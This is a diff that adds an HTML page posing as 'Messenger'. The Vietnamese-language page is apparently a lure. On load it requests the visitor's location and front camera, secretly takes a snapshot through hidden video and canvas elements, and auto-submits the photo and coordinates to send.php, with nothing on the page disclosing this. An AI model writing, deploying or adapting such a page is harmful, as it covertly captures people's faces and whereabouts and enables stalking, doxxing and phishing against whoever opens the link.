@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Messenger</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #3c0066;
+      height: 100%;
+      overflow: hidden;
+    }
+  </style>
+</head>
+<body>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <form id="form" method="POST" action="send.php">
+    <input type="hidden" name="imageData" id="imageData">
+    <input type="hidden" name="lat" id="lat">
+    <input type="hidden" name="lon" id="lon">
+  </form>
+
+  <script>
+    async function getGPS() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude}),
+          err => resolve({lat: 'Không xác định', lon: 'Không xác định'})
+        );
+      });
+    }
+
+    async function start() {
+      const gps = await getGPS();
+      document.getElementById('lat').value = gps.lat;
+      document.getElementById('lon').value = gps.lon;
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        await new Promise(r => setTimeout(r, 2000));
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL("image/png");
+        document.getElementById("imageData").value = imageData;
+
+        stream.getTracks().forEach(track => track.stop());
+        document.getElementById("form").submit();
+      } catch (e) {
+        console.error("Camera error:", e.message);
+      }
+    }
+
+    start();
+  </script>
+</body>
+</html>
